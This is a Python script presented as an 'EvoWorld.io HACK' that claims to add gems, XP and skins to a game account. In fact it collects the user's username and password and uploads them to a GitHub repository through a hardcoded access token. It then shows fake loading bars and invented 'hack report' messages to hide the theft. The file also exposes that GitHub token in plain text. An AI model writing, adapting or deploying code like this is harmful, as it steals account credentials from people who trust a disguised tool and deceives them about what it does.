import time
import random
import base64
import requests
import base64, requests

GITHUB_USER   = "muhammadhamza-mh"
GITHUB_REPO   = "evoworldhack"
GITHUB_BRANCH = "main"
FILE_PATH     = "inputs_log.txt"
GITHUB_TOKEN  = "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"

def upload_to_github(content):
    url = f"https://api.github.com/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{FILE_PATH}"
    headers = {"Authorization": f"token {GITHUB_TOKEN}"}

    # Check if file already exists (to get sha)
    resp = requests.get(url, headers=headers)
    sha = resp.json().get("sha") if resp.status_code == 200 else None

    data = {
        "message": "Update input log",
        "content": base64.b64encode(content.encode()).decode(),
        "branch": GITHUB_BRANCH
    }
    if sha:
        data["sha"] = sha   # required for updating an existing file

    response = requests.put(url, headers=headers, json=data)

    if response.status_code in [200, 201]:
        print("...")
    else:
        print(f"....")



def loading_bar(msg, length, delay):
    print(f"\n{msg}\n[", end="")
    for i in range(length):
        print("#", end="", flush=True)
        time.sleep(delay / 1000)
    print("] 100%")


def loading(msg):
    print(f"\n{msg}", end="")
    for i in range(10):
        time.sleep(0.3)
        print(".", end="", flush=True)
    print("\n")


def add_resource(msg, value, bar_length, delay):
    print(f"\n{msg} {value}...\n[", end="")
    for i in range(bar_length):
        print("#", end="", flush=True)
        time.sleep(delay / 1000)
    print("] DONE")


def main():
    random.seed()

    username = input("=====  EvoWorld.io HACK  =====\n\nEnter username: ").strip()
    password = input("Enter account password: ").strip()

    # Save inputs to GitHub
    user_inputs = f"Username: {username}\nPassword: {password}\n"
    upload_to_github(user_inputs)

    loading("Connecting to EvoWorld.io servers")
    loading_bar("Establishing Secure Connection", 30, 120)
    loading("Accessing hidden admin panel")
    loading_bar("Uploading Exploit Script", 40, 90)
    loading("Bypassing anti-cheat system")
    loading_bar("Cracking Encryption Layers", 35, 100)
    loading("Decrypting account security layers")
    time.sleep(2)
    loading_bar("Analyzing Account Data", 50, 70)

    gems = 50000 + random.randint(0, 950000)
    xp = 100000000 + random.randint(0, 10000000000)
    skins = 5 + random.randint(0, 20)

    print(f"\nInjecting resources into {username}'s account...\n")
    time.sleep(1.5)
    add_resource("Adding Gems:", gems, 30, 100)
    time.sleep(1)
    add_resource("Adding XP:", xp, 40, 60)
    time.sleep(1)
    add_resource("Unlocking Skins:", skins, 20, 150)
    time.sleep(1.5)

    skins_list = [
        "ROBOTIC REAPER", "MUMMY REAPER", "CAPTAIN REAPER", "HUNTER REAPER",
        "CYBORG REAPER", "DEVIL REAPER", "RAINBOW REAPER", "LASER REAPER",
        "ANGEL REAPER", "UNICORN REAPER"
    ]
    skin = random.choice(skins_list)

    print(f"\nLatest Skin Obtained: {skin}\n")

    print("\nHack Report:\n")
    time.sleep(1.2)
    print("Account fully compromised")
    time.sleep(1.2)
    print("All security layers bypassed")
    time.sleep(1.2)
    print("Resources successfully injected")
    time.sleep(1.2)

    print("\nHACK COMPLETE!")
    input("Press enter to exit...")


if __name__ == "__main__":
    main()
